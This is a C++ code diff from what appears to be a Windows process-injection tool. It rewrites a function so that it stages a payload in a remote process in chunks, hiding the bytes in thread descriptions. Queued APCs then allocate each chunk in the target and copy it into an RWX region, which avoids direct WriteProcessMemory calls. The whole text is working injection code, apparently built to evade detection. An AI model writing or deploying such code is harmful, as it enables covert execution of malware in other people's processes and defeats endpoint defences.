@@ -186,67 +186,151 @@ HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
     return INVALID_HANDLE_VALUE;
 }
 
-LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr) {
-    HANDLE hThread = findThread(hProcess, SYNCHRONIZE | THREAD_SET_LIMITED_INFORMATION | THREAD_SET_CONTEXT);
 
-    if (hThread == INVALID_HANDLE_VALUE) {
-        std::cerr << "Cannot find a thread in the target process!\n";
-        return nullptr;
+
+
+HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
+{
+    typedef NTSTATUS(NTAPI* pRtlInitUnicodeStringEx)(
+        PUNICODE_STRING DestinationString,
+        PCWSTR SourceString
+        );
+    typedef NTSTATUS(NTAPI* pNtSetInformationThread)(
+        HANDLE ThreadHandle,
+        THREADINFOCLASS ThreadInformationClass,
+        PVOID ThreadInformation,
+        ULONG ThreadInformationLength
+        );
+
+    UNICODE_STRING DestinationString = { 0 };
+
+    // Create temporary buffer without null bytes
+    BYTE* padding = (BYTE*)calloc(buf_size + sizeof(WCHAR), 1);
+    if (!padding) return E_OUTOFMEMORY;
+    memset(padding, 'A', buf_size);
+
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    auto _RtlInitUnicodeStringEx = (pRtlInitUnicodeStringEx)GetProcAddress(hNtdll, "RtlInitUnicodeStringEx");
+    auto _NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
+
+    if (!_RtlInitUnicodeStringEx || !_NtSetInformationThread) {
+        free(padding);
+        return E_FAIL;
     }
 
-    HRESULT hr = SetThreadDescription(hThread, (PCWSTR)payload);
-    if (FAILED(hr)) {
-        std::cerr << "SetThreadDescription failed! HRESULT: 0x" << std::hex << hr << "\n";
-        CloseHandle(hThread);
-        return nullptr;
+    // Initialize with padding
+    _RtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);
+
+    // Overwrite with real payload (including null bytes)
+    memcpy(DestinationString.Buffer, buf, buf_size);
+
+    // Call NtSetInformationThread directly
+    const THREADINFOCLASS ThreadNameInformation = (THREADINFOCLASS)0x26;
+    NTSTATUS status = _NtSetInformationThread(
+        hThread,
+        ThreadNameInformation,
+        &DestinationString,
+        0x10
+    );
+
+    /* NTSTATUS status = _NtSetInformationThread(
+        hThread,
+        ThreadNameInformation,
+        &DestinationString,
+        sizeof(UNICODE_STRING)
+    );*/
+
+    free(padding);
+    return HRESULT_FROM_NT(status);
+}
+
+
+
+LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr, HANDLE hThread, LPVOID rwx) {
+    // FUNCTION RESOLUTION (your original API loading code)
+    // ---------------------------------------------------------
+    // Assuming these global variables or helper functions are defined elsewhere:
+    // pReadProcessMemory, getFunctionAddressByHash, _NtQueueApcThreadEx2, CW_STR, etc.
+    // Cleaned up a bit to focus on the loop logic.
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    void* pRtlMoveMemory = (void*)GetProcAddress(hNtdll, "RtlMoveMemory");
+    if (!pRtlMoveMemory) return nullptr;
+
+    // ---------------------------------------------------------
+    // CHUNKING LOOP LOGIC
+    // ---------------------------------------------------------
+    // Define a safe block size.
+    // Must be LESS than 65535. Using 0x8000 (32768 bytes) for safety margin.
+    //const size_t MAX_BLOCK_SIZE = 0x8000;
+
+    // 49,152
+    //const size_t MAX_BLOCK_SIZE = 0xC000;
+
+    // 61,440
+    const size_t MAX_BLOCK_SIZE = 0xF000;
+
+    size_t bytesWritten = 0;
+
+    while (bytesWritten < payload_size) {
+        // 1. Calculate current chunk size
+        size_t remaining = payload_size - bytesWritten;
+        size_t currentChunkSize = (remaining > MAX_BLOCK_SIZE) ? MAX_BLOCK_SIZE : remaining;
+
+        // Pointer to the start of the current chunk in YOUR memory
+        BYTE* currentPayloadPtr = payload + bytesWritten;
+
+        // Pointer to the destination in REMOTE memory (advancing the rwx pointer)
+        void* currentRemoteDest = (BYTE*)rwx + bytesWritten;
+
+        std::cout << "[*] Processing chunk: " << currentChunkSize << " bytes..." << std::endl;
+
+        // 2. Use your original function to set this chunk in the thread description
+        HRESULT hr = mySetThreadDescription(hThread, currentPayloadPtr, currentChunkSize);
+        if (FAILED(hr)) {
+            std::cerr << "SetThreadDescription failed on chunk! HR: " << std::hex << hr << "\n";
+            return nullptr;
+        }
+
+        // 3. Queue APC #1: Force the process to allocate the description and write the address to remotePtr
+        if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
+            std::cerr << "Failed to queue GetThreadDescription APC\n";
+            return nullptr;
+        }
+
+        // Important: Wait for the APC to execute.
+        Sleep(10000);
+
+        // 4. Read where the OS stored our chunk (ReadProcessMemory)
+        ULONG_PTR realPayloadPtr = 0;
+
+        // Your retry logic would go here if needed...
+        if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
+            std::cerr << "Failed to read ptr inside loop. GLE: " << GetLastError() << "\n";
+            return nullptr;
+        }
+
+        if (!realPayloadPtr) {
+            std::cerr << "Ptr is NULL inside loop.\n";
+            return nullptr;
+        }
+
+        // 5. Queue APC #2: Move memory from description (realPayloadPtr) to final destination (rwx + offset)
+        if (!_NtQueueApcThreadEx2(hThread, pRtlMoveMemory, currentRemoteDest, (void*)realPayloadPtr, (void*)currentChunkSize)) {
+            std::cerr << "Failed to queue memcpy APC\n";
+            return nullptr;
+        }
+
+        // Advance counters
+        bytesWritten += currentChunkSize;
+
+        // Small pause to ensure memcpy happens before overwriting description next iteration
+        Sleep(1000);
     }
 
-    if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
-        std::cerr << "Failed to queue APC\n";
-        CloseHandle(hThread);
-        return nullptr;
-    }
+    std::cout << "[+] All chunks staged. Waiting for nexts steps..." << std::endl;
 
-    CloseHandle(hThread);
-
-    Sleep(1500);
-
-    ULONG_PTR realPayloadPtr = 0;
-    if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
-        std::cerr << "Failed to read pointer from PEB. GLE: " << GetLastError() << "\n";
-        return nullptr;
-    }
-
-    if (!realPayloadPtr) {
-        std::cerr << "APC executed but returned NULL pointer\n";
-        return nullptr;
-    }
-
-    //// Dump copied payload bytes from remote heap
-    //std::vector<BYTE> dumpBuf(payload_size);
-
-    //if (!ReadProcessMemory(
-    //    hProcess,
-    //    (LPCVOID)realPayloadPtr,
-    //    dumpBuf.data(),
-    //    dumpBuf.size(),
-    //    nullptr))
-    //{
-    //    std::cerr << "Failed to read payload bytes. GLE: "
-    //        << GetLastError() << "\n";
-    //    return nullptr;
-    //}
-
-    //std::cout << "[+] Copied payload bytes at 0x"
-    //    << std::hex << realPayloadPtr << ":\n";
-
-    //for (size_t i = 0; i < dumpBuf.size(); i++) {
-    //    printf("%02X ", dumpBuf[i]);
-    //    if ((i + 1) % 16 == 0)
-    //        printf("\n");
-    //}
-    //printf("\n");
-
-
-    return (LPVOID)realPayloadPtr;
+    // Optional final sleep
+    Sleep(5000);
+    // Return the base RWX address (realPayloadPtr changes each iteration so it's not valid at the end)
+    return rwx;
 }
